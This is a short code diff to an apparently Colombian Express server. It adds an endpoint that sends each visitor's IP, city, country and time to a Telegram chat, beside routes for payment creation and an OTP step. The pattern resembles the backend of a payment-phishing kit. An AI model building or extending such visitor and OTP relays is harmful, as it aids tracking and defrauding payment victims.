@@ -118,6 +118,28 @@ function textoPasoOTP(pago) {
 }
 
 // ============================================================
+// 🚪 POST /api/nuevo-ingreso  → Notifica entrada al index
+// ============================================================
+app.post('/api/nuevo-ingreso', async (req, res) => {
+    try {
+        const { ip, ciudad, pais, user_agent } = req.body || {};
+
+        const mensaje =
+            `🚪 <b>NUEVO INGRESO</b>\n\n` +
+            `🌐 <b>IP:</b> <code>${ip || 'Desconocida'}</code>\n` +
+            `🏙️ <b>Ciudad:</b> ${ciudad || 'Desconocida'}\n` +
+            `🌎 <b>País:</b> ${pais || 'Desconocido'}\n` +
+            `🕒 <b>Hora:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+
+        await tgSendMessage(mensaje);
+        return res.json({ success: true });
+    } catch (err) {
+        console.error("Error en /api/nuevo-ingreso:", err);
+        return res.status(500).json({ success: false });
+    }
+});
+
+// ============================================================
 // 📥 POST /api/crear-pago
 // ============================================================
 
